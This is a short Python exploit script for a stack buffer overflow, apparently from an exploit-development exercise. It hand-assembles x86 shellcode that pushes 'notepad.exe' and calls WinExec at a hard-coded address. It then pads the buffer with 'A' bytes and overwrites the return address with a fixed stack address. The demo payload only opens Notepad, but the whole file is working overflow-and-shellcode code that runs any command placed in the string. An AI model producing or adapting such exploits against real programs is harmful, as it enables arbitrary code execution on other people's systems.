buf=""
buf += "\x8B\xC4"             # mov eax, esp
buf += "\x80\xEC\x01"         # sub ah, 1
buf += "\x8B\xE0"             #mov esp, eax

#buf += "\x31\xc0"             # xor eax, eax
#buf += "\x50"                 # push eax

buf += "\xB8Aexe"             # MOV EAX, 'Aexe'
buf += "\xC1\xE8\x08"         # SHR EAX,8
buf += "\x50"                 # push eax

buf += "\x68pad."             # push 0x...

buf += "\x68note"             # push 0x...

#buf += "\xB8Anot"             # MOV EAX, 'Anot'
#buf += "\xC1\xE8\x08"         # SHR EAX,8
#buf += "\x50"                 # push eax

buf += "\x8b\xc4"             # mov eax, esp
buf += "\x6A\x05"             # push 5
buf += "\x50"                 # push eax
buf += "\xB8\x80\xD3\x11\x77" # mov eax, WinExec # 7711D380 WinExec
# buf += "\x40"               # inc eax
buf += "\xFF\xD0"             # call eax
buf += "A" * (0x88 - len(buf))
buf += "\x9C\xFE\x19\x00"     # 0019FE9C
print(buf)

# notepad.exe